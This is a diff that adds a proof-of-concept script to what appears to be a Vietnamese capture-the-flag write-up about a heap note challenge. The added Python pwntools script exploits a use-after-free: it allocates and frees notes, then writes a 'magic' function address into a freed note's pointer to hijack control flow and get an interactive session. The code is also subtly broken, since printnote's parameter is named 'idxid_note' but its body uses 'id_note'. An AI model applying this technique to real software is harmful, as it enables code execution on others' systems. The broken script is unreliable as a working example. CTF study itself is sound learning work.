@@ -578,4 +578,55 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 + Gọi Print_note với index là 1
 
 **6.Script**
-- Update sau....
+- PoC
+
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+
+host = "127.0.0.1"
+port = 1234
+
+sh = remote(host,port)
+
+def addnote(size, content):
+    sh.recvuntil(":")
+    sh.sendline("1")
+    sh.recvuntil(":")
+    sh.sendline(str(size))
+    sh.recvuntil(":")
+    sh.sendline(content)
+
+
+def delnote(id_note):
+    sh.recvuntil(":")
+    sh.sendline("2")
+    sh.recvuntil(":")
+    sh.sendline(str(id_note))
+
+
+def printnote(idxid_note):
+    sh.recvuntil(":")
+    sh.sendline("3")
+    sh.recvuntil(":")
+    sh.sendline(str(id_note))
+
+
+magic = 0x08048986
+
+addnote(32, "AAAA")
+addnote(32, "AAAA")
+addnote(32, "AAAA")
+
+delnote(0)
+delnote(1)
+delnote(2)
+
+addnote(8, p32(magic))
+
+printnote(1)
+
+sh.interactive()
+```
